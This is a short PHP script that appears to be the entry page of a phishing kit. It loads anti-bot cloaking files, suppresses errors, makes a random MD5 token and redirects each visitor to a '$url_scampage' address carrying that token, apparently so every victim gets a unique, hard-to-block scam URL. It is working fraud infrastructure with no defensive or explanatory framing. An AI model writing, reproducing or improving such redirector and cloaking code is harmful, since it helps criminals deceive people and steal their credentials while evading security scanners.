<?php
session_start();
error_reporting(0);

require_once './config_bots.php';
require_once './antibots.php'; // This one file now handles all security and logging.

// --- Prevent Browser Caching ---
// These headers tell the browser to always request a fresh version of this page.
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: 0");

// --- Use a more reliable method for a unique ID ---
// The old rand() function was failing. uniqid() is much more robust.
$unique_id = uniqid('', true);
$md5 = md5($unique_id);


function recurse_copy($src, $dst) {
    $dir = opendir($src);
    @mkdir($dst);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($src . '/' . $file) ) {
                recurse_copy($src . '/' . $file, $dst . '/' . $file);
            } else {
                copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$src = "$url_scampage?GPeticiones?PN=$md5";
header("location:$src");
exit(); // It's also good practice to add an exit() after a location header.
?>